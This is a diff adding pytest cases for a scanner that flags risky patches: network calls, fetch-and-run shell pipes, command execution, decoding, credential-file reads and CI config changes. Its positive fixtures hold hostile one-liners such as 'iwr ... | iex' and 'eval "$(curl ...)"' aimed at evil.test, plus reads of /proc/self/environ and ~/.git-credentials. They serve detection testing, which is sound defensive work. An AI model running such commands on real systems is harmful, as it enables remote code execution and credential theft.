@@ -581,3 +581,147 @@ def test_sec008_dynamic_access_negative(patch):
     assert len(findings) == 0
 
 
+# ──────────────────────────────────────────────────────────────────────────────
+# Generalization Pass Tests:
+# SEC001: urllib3, ftplib, smtplib, websocket, grpc, asyncio.open_connection
+# SEC002: iwr | iex, Invoke-Expression, eval $(curl ...), <(curl ...), download-then-run ;
+# SEC003: asyncio.create_subprocess_exec, runpy.run_path, code.InteractiveConsole, ctypes.system
+# SEC004: base64.b16decode/b32decode/a85decode, zlib/bz2/lzma/gzip.decompress
+# SEC005: /proc/self/environ, .git-credentials, .pypirc, .npmrc, .docker/config.json, boto3.get_credentials, dict(os.environ), printenv
+# SEC006: .circleci/config.yml, azure-pipelines.yml, bitbucket-pipelines.yml, .travis.yml, appveyor.yml, Dockerfile doc exemption
+# ──────────────────────────────────────────────────────────────────────────────
+@pytest.mark.parametrize("patch", [
+    "--- a/src/net.py\n+++ b/src/net.py\n@@ -1,1 +1,2 @@\n+pool = urllib3.PoolManager()\n",
+    "--- a/src/ftp.py\n+++ b/src/ftp.py\n@@ -1,1 +1,2 @@\n+ftp = ftplib.FTP('ftp.example.com')\n",
+    "--- a/src/async_net.py\n+++ b/src/async_net.py\n@@ -1,1 +1,2 @@\n+reader, writer = await asyncio.open_connection('evil.test', 80)\n",
+    "--- a/src/ws.py\n+++ b/src/ws.py\n@@ -1,1 +1,2 @@\n+async with websockets.connect('ws://evil.test') as ws:\n",
+])
+def test_sec001_generalization_positive(patch):
+    findings = check_network_calls(patch)
+    assert len(findings) >= 1
+    assert all(f["rule_id"] == "SEC001_NETWORK_CALL" for f in findings)
+
+
+@pytest.mark.parametrize("patch", [
+    "--- a/src/local.py\n+++ b/src/local.py\n@@ -1,1 +1,2 @@\n+ftp_path = '/local/ftp/storage'\n",
+    "--- a/src/config.py\n+++ b/src/config.py\n@@ -1,1 +1,2 @@\n+grpc_timeout_seconds = 30\n",
+    "--- a/src/text.py\n+++ b/src/text.py\n@@ -1,1 +1,2 @@\n+def format_socket(name): return f'sock:{name}'\n",
+])
+def test_sec001_generalization_negative(patch):
+    findings = check_network_calls(patch)
+    assert len(findings) == 0
+
+
+@pytest.mark.parametrize("patch", [
+    "--- a/script.ps1\n+++ b/script.ps1\n@@ -1,1 +1,2 @@\n+iwr http://evil.test/x.ps1 | iex\n",
+    "--- a/run.sh\n+++ b/run.sh\n@@ -1,1 +1,2 @@\n+eval \"$(curl -fsSL http://evil.test/sh)\"\n",
+    "--- a/proc.sh\n+++ b/proc.sh\n@@ -1,1 +1,2 @@\n+sh <(wget -qO- http://evil.test/sh)\n",
+    "--- a/line.sh\n+++ b/line.sh\n@@ -1,1 +1,2 @@\n+curl -o /tmp/s http://evil.test/s; bash /tmp/s\n",
+])
+def test_sec002_generalization_positive(patch):
+    findings = check_shell_pipe(patch)
+    assert len(findings) >= 1
+    assert all(f["rule_id"] == "SEC002_SHELL_PIPE" for f in findings)
+    assert all(f["severity"] == "CRITICAL" for f in findings)
+
+
+@pytest.mark.parametrize("patch", [
+    "--- a/test.ps1\n+++ b/test.ps1\n@@ -1,1 +1,2 @@\n+Write-Host 'running iwr test'\n",
+    "--- a/script.sh\n+++ b/script.sh\n@@ -1,1 +1,2 @@\n+eval \"$local_var\"\n",
+    "--- a/build.sh\n+++ b/build.sh\n@@ -1,1 +1,2 @@\n+echo 'done'; ls -la\n",
+])
+def test_sec002_generalization_negative(patch):
+    findings = check_shell_pipe(patch)
+    assert len(findings) == 0
+
+
+@pytest.mark.parametrize("patch", [
+    "--- a/src/proc.py\n+++ b/src/proc.py\n@@ -1,1 +1,2 @@\n+proc = await asyncio.create_subprocess_exec('id')\n",
+    "--- a/src/runner.py\n+++ b/src/runner.py\n@@ -1,1 +1,2 @@\n+runpy.run_path('/tmp/evil.py')\n",
+    "--- a/src/repl.py\n+++ b/src/repl.py\n@@ -1,1 +1,2 @@\n+console = code.InteractiveConsole()\n",
+    "--- a/src/ffi.py\n+++ b/src/ffi.py\n@@ -1,1 +1,2 @@\n+ctypes.cdll.msvcrt.system('dir')\n",
+])
+def test_sec003_generalization_positive(patch):
+    findings = check_command_exec(patch)
+    assert len(findings) >= 1
+    assert all(f["rule_id"] == "SEC003_COMMAND_EXEC" for f in findings)
+
+
+@pytest.mark.parametrize("patch", [
+    "--- a/src/types.py\n+++ b/src/types.py\n@@ -1,1 +1,2 @@\n+class CTypesWrapper: pass\n",
+    "--- a/src/run.py\n+++ b/src/run.py\n@@ -1,1 +1,2 @@\n+runpy_version = '1.0'\n",
+    "--- a/src/code_gen.py\n+++ b/src/code_gen.py\n@@ -1,1 +1,2 @@\n+code_block = '''print(1)'''\n",
+])
+def test_sec003_generalization_negative(patch):
+    findings = check_command_exec(patch)
+    assert len(findings) == 0
+
+
+@pytest.mark.parametrize("patch", [
+    "--- a/src/b16.py\n+++ b/src/b16.py\n@@ -1,1 +1,2 @@\n+data = base64.b16decode('4142')\n",
+    "--- a/src/zlib_dec.py\n+++ b/src/zlib_dec.py\n@@ -1,1 +1,2 @@\n+raw = zlib.decompress(compressed)\n",
+    "--- a/src/gzip_dec.py\n+++ b/src/gzip_dec.py\n@@ -1,1 +1,2 @@\n+text = gzip.decompress(gz_data)\n",
+    "--- a/src/bz2_dec.py\n+++ b/src/bz2_dec.py\n@@ -1,1 +1,2 @@\n+out = bz2.decompress(bz_bytes)\n",
+])
+def test_sec004_generalization_positive(patch):
+    findings = check_obfuscation(patch)
+    assert len(findings) >= 1
+    assert all(f["rule_id"] == "SEC004_OBFUSCATION" for f in findings)
+
+
+@pytest.mark.parametrize("patch", [
+    "--- a/src/compress.py\n+++ b/src/compress.py\n@@ -1,1 +1,2 @@\n+blob = zlib.compress(raw_bytes)\n",
+    "--- a/src/encode.py\n+++ b/src/encode.py\n@@ -1,1 +1,2 @@\n+enc = base64.b16encode(b'test')\n",
+    "--- a/src/data.py\n+++ b/src/data.py\n@@ -1,1 +1,2 @@\n+def decompress_cache(): pass\n",
+])
+def test_sec004_generalization_negative(patch):
+    findings = check_obfuscation(patch)
+    assert len(findings) == 0
+
+
+@pytest.mark.parametrize("patch", [
+    "--- a/src/proc_env.py\n+++ b/src/proc_env.py\n@@ -1,1 +1,2 @@\n+data = open('/proc/self/environ').read()\n",
+    "--- a/src/auth.py\n+++ b/src/auth.py\n@@ -1,1 +1,2 @@\n+creds = open('~/.git-credentials').read()\n",
+    "--- a/src/aws.py\n+++ b/src/aws.py\n@@ -1,1 +1,2 @@\n+cred_obj = session.get_credentials()\n",
+    "--- a/src/env_dump.py\n+++ b/src/env_dump.py\n@@ -1,1 +1,2 @@\n+env_map = dict(os.environ)\n",
+])
+def test_sec005_generalization_positive(patch):
+    findings = check_credential_reads(patch)
+    assert len(findings) >= 1
+    assert all(f["rule_id"] == "SEC005_CREDENTIAL_READS" for f in findings)
+
+
+@pytest.mark.parametrize("patch", [
+    "--- a/src/proc.py\n+++ b/src/proc.py\n@@ -1,1 +1,2 @@\n+proc_path = '/proc/cpuinfo'\n",
+    "--- a/src/env.py\n+++ b/src/env.py\n@@ -1,1 +1,2 @@\n+environment_name = 'production'\n",
+    "--- a/src/dict_util.py\n+++ b/src/dict_util.py\n@@ -1,1 +1,2 @@\n+items = dict([('a', 1)])\n",
+])
+def test_sec005_generalization_negative(patch):
+    findings = check_credential_reads(patch)
+    assert len(findings) == 0
+
+
+@pytest.mark.parametrize("patch", [
+    "--- a/.circleci/config.yml\n+++ b/.circleci/config.yml\n@@ -1,1 +1,2 @@\n+version: 2.1\n",
+    "--- a/azure-pipelines.yml\n+++ b/azure-pipelines.yml\n@@ -1,1 +1,2 @@\n+trigger:\n- main\n",
+    "--- a/bitbucket-pipelines.yml\n+++ b/bitbucket-pipelines.yml\n@@ -1,1 +1,2 @@\n+pipelines: default: []\n",
+    "--- a/.travis.yml\n+++ b/.travis.yml\n@@ -1,1 +1,2 @@\n+language: python\n",
+    "--- a/appveyor.yml\n+++ b/appveyor.yml\n@@ -1,1 +1,2 @@\n+build: off\n",
+])
+def test_sec006_generalization_positive(patch):
+    findings = check_workflow_build(patch)
+    assert len(findings) >= 1
+    assert all(f["rule_id"] == "SEC006_WORKFLOW_BUILD" for f in findings)
+
+
+@pytest.mark.parametrize("patch", [
+    "--- a/docs/Dockerfile.rst\n+++ b/docs/Dockerfile.rst\n@@ -1,1 +1,2 @@\n+Docker documentation\n",
+    "--- a/docs/setup.md\n+++ b/docs/setup.md\n@@ -1,1 +1,2 @@\n+Setup instructions\n",
+    "--- a/guide/ci.rst\n+++ b/guide/ci.rst\n@@ -1,1 +1,2 @@\n+CI documentation details\n",
+])
+def test_sec006_doc_paths_ignored_negative(patch):
+    findings = check_workflow_build(patch)
+    assert len(findings) == 0
+
+
+
